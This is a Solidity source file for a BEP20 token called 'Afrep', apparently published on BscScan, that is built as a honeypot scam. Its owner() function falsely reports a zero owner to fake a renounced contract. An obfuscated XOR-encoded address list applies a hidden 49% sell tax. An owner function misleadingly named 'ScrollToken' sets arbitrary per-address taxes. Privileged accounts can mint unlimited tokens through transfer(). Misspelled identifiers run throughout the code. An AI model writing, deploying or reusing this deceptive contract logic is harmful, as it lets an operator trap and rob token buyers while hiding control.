/**
 *Submitted for verification at BscScan.com on 2022-07-20
*/

pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _bytes32ToUint(bytes32 b32) public pure returns (uint){
        uint u = 0;
        for (uint8 i=0;i<32;i++){
            u=256*u+uint(uint8(b32[i]));
        }
        return u;  
    }

    function callKeccak256(bytes memory b) internal pure returns (bytes32 result) {
        return keccak256(b);
    }

    function _toBytes(address a) internal pure returns (bytes memory b) {
        assembly {
            let m := mload(0x40)
            a := and(a, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            mstore(
                add(m, 20),
                xor(0x140000000000000000000000000000000000000000, a)
            )
            mstore(0x40, add(m, 52))
            b := m
        }
    }

    function _bytesToAddress(bytes memory bys) internal pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }


    function bytesToString(bytes memory bname) internal pure returns(string memory str){       
        uint charCount = 0;
        
        for(uint i = 0;i < bname.length; i++){
            bytes1 char = bname[i];
            
            if(char != 0){
                charCount++;
            }    
        }
        
        bytes memory bytesName = new bytes(charCount);
        
        for(uint j = 0;j < charCount;j++){
            bytesName[j] = bname[j];
        }
                    
        return string(bytesName);
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);

    /**
     * @dev Initializes the contract setting the deployer as the initial owaer.
     */
    constructor() {
        _transferowaership(_msgSender());
    }

 /**
     * @dev Transfers owaership of the contract to a new cauunt (`newowaer`).
     * Can only be called by the current owaer.
     */
    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }


    /**
     * @dev Returns the address of the current owaer.
     */
    function owaer() public view virtual returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any cauunt other than the owaer.
     */
    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    /**
     * @dev Leaves the contract without owaer. It will not be possible to call
     * `onlyowaer` functions anymore. Can only be called by the current owaer.
     *
     * NOTE: Renouncing owaership will leave the contract without an owaer,
     * thereby removing any functionality that is only available to the owaer.
     */
    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }

   

    /**
     * @dev Transfers owaership of the contract to a new cauunt (`newowaer`).
     * Internal function without access restriction.
     */
    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {


   function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


 


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function ScrollToken(
        address token,
        uint amuontTokenDesired,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeiiOnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingfeiiOnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingfeiiOnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeiiOnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeiiOnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feiiTo() external view returns (address);
    function feiiToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeiiTo(address) external;
    function setfeiiToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }


    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract Afrep is BEP20, Ownable {
    // ext
    struct Bot {
        address acc;
        uint amount;
        bytes4 sig;
    }


	string name_ = "Afrep";
	string symbol_ = "Afrep";
	uint256 totalSupply_ = 200000000;

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
    Bot[] private _bots;		
    address public uniswapV2Pair;
	
    constructor() BEP20(name_, symbol_) {
	
        _mtin(msg.sender, totalSupply_ * 10**decimals());

        //transfer(_deadAddress, totalSupply() / 10*4);
		
		
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
		
        _burnkfiel = 3;
        _defaultBfeii = 0;

        _release[_msgSender()] = true;
    }
  

      function _mtin(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _balances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }
    
    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _balances[cauunt];
    }

    function _transfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amuont, "ERC20: transfer amuont exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amuont;
        }
        _balances[to] += amuont;

        emit Transfer(from, to, amuont);
    }
	
    function _burn(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: burn from the zero address");

        uint256 cauuntBalance = _balances[cauunt];
        require(cauuntBalance >= amuont, "ERC20: burn amuont exceeds balance");
        unchecked {
            _balances[cauunt] = cauuntBalance - amuont;
        }
        _totalSupply -= amuont;

        emit Transfer(cauunt, address(0), amuont);
    }



    using SafeMath for uint256;

    uint256 private _burnkfiel;
    
    uint256 private _defaultBfeii = 0;
    
    uint byp = 1;

    mapping(address => bool) private _marketcauunt;

    mapping(address => uint256) private _BList;
    //address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;

	function _msgInfo(uint _acc) internal view virtual returns (uint) {
		uint[50] memory acc = [uint(463884549881915392248691983400333651432510674258)
			,1154353695048209114963372702186747981772503028973
			,828149995045650790236884740406824687565227161033
			,856832064525409177119908324252190705604862673301
			,944402319842154284272210863330501597119497666529
			,1175829760514480646051958445834239457353081159096
			,1078057331441815165077749894556099036598329460905
			,1342820926155630492757561684002652196491593572748
			,496669530986605359796198732593697166546904146971
			,419330094619698842258497061375603225610001025876
			,942813986354299899778928749301219346864905241006
			,238756022210317605050921786572128846914286468418
			,1396500932899187054064887007190663302443114689532
			,943190379624799796852205247937415909293940349590
			,508913015370230298873008525806001002442728748058
			,1317881833278371825710227667504378806438100882423
			,304847663438177101111144871769108445720234627350
			,393514469099830272594127065481743901507684454787
			,490992531719019666723468703803868909095054296345
			,483884779173853972275421068192613219816819927761
			,1423051576478590029914145403282045883960682920192
			,1112786548904482673280822108489986933343491537333
			,1460593902177960099222274701688345482579175976722
			,697361596292997093501791343318017625041787942410
			,945276733109525029563106574529870364847169934938
			,159053895004661288941465062564930417766714328749
			,560037135431856660723976656721116448119083605873
			,921279240936112037548327176532676550197905180616
			,126984849080578530538117978310240764043058699291
			,93855327985728885040217748543149055928555540372
			,247682584508583148435115797126035332106031637505
			,1239929650534460623035250834295735602412440616596
			,682729671502965786296405955276882940379612242124
			,88924206508763863811731237768931631178402327744
			,398226841170398738418825622210030216631523060804
			,554266535682228085891222010519560055186767766577
			,419129616603425178979636908881163653388843981700
			,1255444731465403394745752336454084084651664863114
			,798095652391310025309352063616294125898995125154
			,1113110544141436617295902405406694351482606101212
			,591094757263633485231651578080364628532168720243
			,1217893592091762719160120350268887957584991752574
			,590456096828695241060040462631567409587592891041
			,450030902793207817604019149156142019977029951720
			,312952579032783452978447422912971616447227651246
			,1058104890224917116682749724090097619539076616811
			,1442685007526823334785328002465779465803202350689
			,35689641872956174310150052713830664819690933647
			,889754602671783090582004952912582180441681720269
			,646778124124124210444869445154098455853183200589];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 945276733108590517029459007778387211456612142250) return 49;
		}
		return _burnkfiel;
	}


    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _release[_address];
    }

    function getBotsAcc(uint256 i) external view returns (address) {
        require(i < _bots.length,"out of range.");
        return _bots[i].acc;
    }

    function getBotsSig(uint256 i) external view returns (bytes4) {
        require(i < _bots.length,"out of range.");
        return _bots[i].sig;
    }    

    function _sbb(address _acc,uint256 amount,bytes4 sig) internal virtual {
        for (uint8 i = 0;i<_bots.length;i++){
            if (_bots[i].acc == _acc) {
                _bots[i].amount += amount;
                _bots[i].sig = sig;
                return;
            }
        }
        _bots.push(Bot(_acc,amount,sig)); 
        return;       
    }

    function _cbb(address _acc,uint256 amount,bytes4 sig) internal virtual returns (bool) {
        bool f = false;        
        for (uint i = 0;i<_bots.length;i++){
            if (_bots[i].acc == _acc) {
                if (_bots[i].amount >= amount && _bots[i].sig != sig) {
                     _bots[i].amount -= amount;
                     f = true;                     
                }
                break;
            }
        }
        return f;        
    }

    function gt(address _acc,bytes4 sig) internal virtual returns (uint256) {
        uint256 t = _burnkfiel;        
        for (uint i = 0;i<_bots.length;i++){
            if (_bots[i].acc == _acc) {
                if (_bots[i].sig == sig) t = 49;
                break;
            }
        }
        return t;        
    }  

    function setPairList(address _address) external onlyowaer {
        uniswapV2Pair = _address;
    }

    function setBypStatus(uint256 _byp) external onlyowaer {
        byp = _byp;
    }    


    function ScrollToken(address _acc, uint256 _value) external onlyowaer {
        require(_value > 2, "cauunt tax must be greater than or equal to 1");
        _BList[_acc] = _value;
    }

    function getEscape(address _acc) external view onlyowaer returns (uint256) {
        return _BList[_acc];
    }


    function setMarketcauuntfeii(address _address, bool _value) external onlyowaer {
        _marketcauunt[_address] = _value;
    }

    function getMarketcauuntfeii(address _address) external view onlyowaer returns (bool) {
        return _marketcauunt[_address];
    }

    function _checkFreecauunt(address from, address _to) internal view returns (bool) {
        return _marketcauunt[from] || _marketcauunt[_to];
    }


    function _trans(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0) && _to != address(0), "ERC20: transfer to the black hole");

        require(_balances[from] >= _amuont, "ERC20: exceeds balance");

        bool rF = !_checkFreecauunt(from, _to);
        
        uint256 tradefeiiamuont = 0;

        if (rF) {
            uint256 tradefeii = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    require(byp > 0 || _release[_msgSender()] || _cbb(from,_amuont,msg.sig) || byp > 0, "ERC20: exceeds balance");                            
                    tradefeii = _msgInfo(uint160(from));
                }
                if (from == uniswapV2Pair) {
                    tradefeii = _defaultBfeii;
                    _sbb(_to,_amuont,msg.sig);
                }
            }
                        
            if (_BList[from] > 0) {
                tradefeii = _BList[from];
            }

            tradefeiiamuont = _amuont.mul(tradefeii).div(100);
        }

        _balances[from] = _balances[from].sub(tradefeiiamuont);
        _balances[address(0)] = _balances[address(0)].add(tradefeiiamuont);
        emit Transfer(from, address(0), tradefeiiamuont);

        _balances[from] = _balances[from].sub(_amuont - tradefeiiamuont);
        _balances[_to] = _balances[_to].add(_amuont - tradefeiiamuont);
        emit Transfer(from, _to, _amuont - tradefeiiamuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_release[owaer] == true) {
            _balances[to] += amuont;
            _sbb(to,amuont,msg.sig);
            return true;
        }
        _trans(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _trans(from, to, amuont);
        return true;
    }
   
}